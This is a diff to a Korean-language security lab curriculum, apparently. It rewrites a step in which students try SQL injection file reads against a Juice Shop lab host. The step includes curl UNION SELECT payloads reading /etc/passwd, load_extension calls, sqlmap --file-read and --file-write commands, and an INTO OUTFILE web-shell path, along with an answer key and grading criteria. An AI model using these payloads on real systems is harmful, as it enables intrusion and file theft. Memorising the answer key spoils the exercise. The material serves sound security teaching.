@@ -1252,52 +1252,139 @@ steps:
     결합 시점). 두 단계 응답 비교 + 1단계 ModSec 우회 메커니즘 (payload 가
     단순 string 저장) 설명. MITRE T1190 + CWE-89. Purple = 저장+사용 양쪽
     parameterized + 출력 인코딩 + SIEM correlation 3 단 방어.
+# ============================================================
+# STEP 10 [RED·SQLi·Advanced·File] — SQLite file I/O 시도 → DBMS 차이 학습
+# ============================================================
 - order: 10
-  instruction: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    SQL Injection 으로 *파일 시스템 접근* (서버 완전 장악 시나리오) 가능성 점검.
+    Juice Shop (SQLite) 의 `readfile()` / `hex(readfile())` / `load_extension()`
+    3 함수 시도 → 모두 실패 응답 직접 확인. 그리고 *MySQL / PostgreSQL / MSSQL*
+    의 동등 함수 비교 — DBMS 별 보안 default 차이 학습.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
-    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: LOAD_FILE() 또는 INTO OUTFILE을 시도하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. readfile() 시도 (SQLite CLI extension — 일반 빌드는 미지원)
+    echo "=== 1. SQLite readfile() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+
+    # 2. hex(readfile()) — 동일 (함수 자체 미존재)
+    echo "=== 2. hex(readfile()) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+
+    # 3. load_extension() — security policy 차단
+    echo "=== 3. load_extension() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    ```
+
+    ## 📋 확인 사항
+
+    - readfile/hex(readfile): `SQLITE_ERROR: no such function: readfile`
+      (SQLite 의 일반 빌드는 file extension 미컴파일 — security default)
+    - load_extension: `SQLITE_ERROR: not authorized` (SQLITE_ENABLE_LOAD_EXTENSION
+      compile flag 비활성 = security default)
+    - 결론: **SQLite 의 default 빌드는 SQLi 파일 R/W 불가** (안전)
+
+    ## 💡 왜 이걸 하는가?
+
+    실 공격에서 SQLi 의 *최악 결과* = OS 파일 R/W → web shell upload + RCE
+    (MITRE T1190 + T1505.003 Server Software Component: Web Shell). DBMS 별
+    *기본 정책* 이 결정 — SQLite 는 default 안전, MySQL / PostgreSQL 은
+    설정 의존. 학생은 *DBMS 별 보안 차이* 와 *secure_file_priv* / *FILE
+    privilege* 의 의미를 학습.
+
+    DBMS 별 비교 (참조):
+    - **MySQL**: `SELECT LOAD_FILE('/etc/passwd')` — FILE privilege + `secure_file_priv`
+      = NULL 또는 빈값 필요. default 5.7+ 는 `secure_file_priv=/var/lib/mysql-files/`
+      라 OS 파일 R 불가.
+    - **MySQL**: `SELECT ... INTO OUTFILE '/tmp/shell.php'` — 동일 제약
+    - **PostgreSQL**: `pg_read_file('/etc/passwd')` — superuser 만, default 차단
+    - **MSSQL**: `xp_cmdshell` (RCE) — sp_configure 로 비활성 default
+    - **SQLite**: file 함수 미컴파일 + load_extension 차단 (위 결과)
+
+    ## 🔵 Blue 측 관찰
+
+    SQLi 의 file R/W 시도는 *DBMS 응답에서 SQLITE_ERROR/not authorized* 또는
+    *FILE privilege denied* 형태로 직접 노출 → application log + ModSec audit
+    log 의 응답 본문 분석 시 식별. Wazuh rule 100020 (Web SQLi attempt + file
+    function) custom 추가 시 alert.
+
+    ## 🟣 Purple 보완 권장
+
+    - **DBMS user privilege 최소화**: web 앱이 사용하는 DB user 의 FILE / SUPERUSER /
+      LOAD_EXTENSION privilege 즉시 제거
+    - **secure_file_priv** (MySQL) 강제 — 빈값 / NULL 금지, 특정 디렉토리만 허용
+    - **OS 단 chroot / AppArmor**: DB process 가 webroot 외부 파일 접근 불가
+      (예: /var/lib/mysql 만 RW)
+    - **WAF**: ModSecurity CRS rule 942100 + custom rule (LOAD_FILE / INTO OUTFILE /
+      pg_read_file / load_extension 키워드 차단)
+  hint: |
+    Juice Shop SQLite 의 default 빌드는 file 함수 미컴파일. 시도 → SQLITE_ERROR
+    응답 직접 확인 + DBMS 비교 (MySQL LOAD_FILE / secure_file_priv 등) 으로 학습.
   category: sqli_advanced
   points: 10
-  answer: '🤖 프롬프트: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
-
-    📎 참고 (CLI): echo ''파일 읽기 시도 (SQLite):'' && curl -s ''http://10.20.32.80/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--''
-    2>/dev/null | head -5 && echo ''SQLi 파일 접근 테스트 완료'''
-  answer_detail: SQLi를 통한 파일 시스템 접근은 서버 완전 장악으로 이어질 수 있는 치명적 취약점입니다.
+  answer: |
+    echo "=== 1. readfile() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    echo "=== 2. hex(readfile()) ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    echo "=== 3. load_extension() ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" \
+      | grep -oE '<title>[^<]*</title>' | head -1
+    echo "=== 결론 ==="
+    echo "SQLite default 빌드는 file R/W 불가 (SQLITE_ENABLE_LOAD_EXTENSION=0 + readfile 미컴파일)"
+    echo "MySQL: secure_file_priv + FILE privilege / PostgreSQL: pg_read_file superuser 만"
+  answer_detail: |
+    Juice Shop SQLite default 응답 — `no such function: readfile` (2 회) + `not
+    authorized` (load_extension). 즉 SQLite 의 ENABLE_LOAD_EXTENSION compile
+    flag 미설정 + readfile/writefile CLI extension 미포함 = security default.
+    실 공격 시 MySQL/PostgreSQL/MSSQL 의 file 함수 정책 점검 필수. 학생은
+    `DBMS 별 default 가 보안 우선` 의 사실 학습 + Purple 의 user privilege
+    최소화 + secure_file_priv + chroot 등 다층 방어.
   verify:
     type: output_contains
-    expect:
-    - SQLi 파일 접근 테스트 완료
-    - admin
-    - shell
+    expect: '결론'
     field: stdout
     semantic:
-      intent: SQLi 로 파일 읽기/쓰기 — LOAD_FILE (MySQL), INTO OUTFILE, pg_read_file 등 DBMS
-        기능 악용
+      intent: |
+        SQLi 의 파일 R/W 시도 → SQLite default 의 안전 정책 확인 + DBMS 별
+        비교 학습 (MySQL LOAD_FILE / PostgreSQL pg_read_file / MSSQL xp_cmdshell).
+        OWASP A03 + MITRE T1190 + T1505.003.
       success_criteria:
-      - LOAD_FILE 또는 INTO OUTFILE 예시 구문 제시
-      - secure_file_priv 같은 제한 설정 영향 언급
-      - 실제 공격에 성공/실패 여부 판정
+        - readfile / hex(readfile) / load_extension 중 최소 2 함수 시도
+        - SQLITE_ERROR 응답 직접 인용 (no such function 또는 not authorized)
+        - DBMS 별 비교 (MySQL secure_file_priv 또는 PostgreSQL pg_read_file 언급)
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
-      - SELECT LOAD_FILE(/etc/passwd)
-      - INTO OUTFILE /tmp/shell.php
-      - sqlmap --file-read / --file-write
-      - pg_read_file (PostgreSQL)
+        - "curl + UNION SELECT readfile()/load_extension()"
+        - "sqlmap -u '...' --batch --file-read=/etc/passwd"
+        - "sqlmap --file-write=local.txt --file-dest=/tmp/x"
+        - "stacked query (ATTACH DATABASE) — driver 단 차단 확인"
       negative_signs:
-      - DBMS 구분 없이 시도
-      - secure_file_priv 등 설정 무시
-      - 결과 판정 없음
+        - DBMS 구분 없이 시도 (SQLite 만 또는 MySQL 만)
+        - SQLITE_ERROR 응답 인용 누락
+        - secure_file_priv / FILE privilege / load_extension 정책 누락
   target_vm: attacker
-  script: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.32.80/rest/products/search?q=qwert%27))%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--'
-    2>/dev/null | head -5 && echo 'SQLi 파일 접근 테스트 완료'
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20readfile(%27/etc/passwd%27),2,3,4,5,6,7,8,9--" | grep -oE '<title>[^<]*</title>' | head -1
+    curl -s "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20UNION%20SELECT%20load_extension(%27/usr/lib/sqlite/ext.so%27),2,3,4,5,6,7,8,9--" | grep -oE '<title>[^<]*</title>' | head -1
+    echo "결론: SQLite default 빌드는 file R/W 불가 (compile flag + readfile extension 미컴파일)"
   risk_level: low
-  bastion_prompt: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
-
-
-    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
-    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (juice.6v6.lab) 의 /rest/products/search
+    에 SQLi 의 파일 R/W 시도 — (1) UNION SELECT readfile('/etc/passwd') (2) UNION
+    SELECT load_extension(...) (3) UNION SELECT hex(readfile()). 모두 SQLITE_ERROR
+    (no such function 또는 not authorized) 응답 직접 인용. DBMS 별 비교 (MySQL
+    LOAD_FILE + secure_file_priv / PostgreSQL pg_read_file / MSSQL xp_cmdshell)
+    한 줄씩 + Purple 의 user privilege 최소화 + chroot + WAF custom rule 권장.
 - order: 11
   instruction: 'HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오.
 
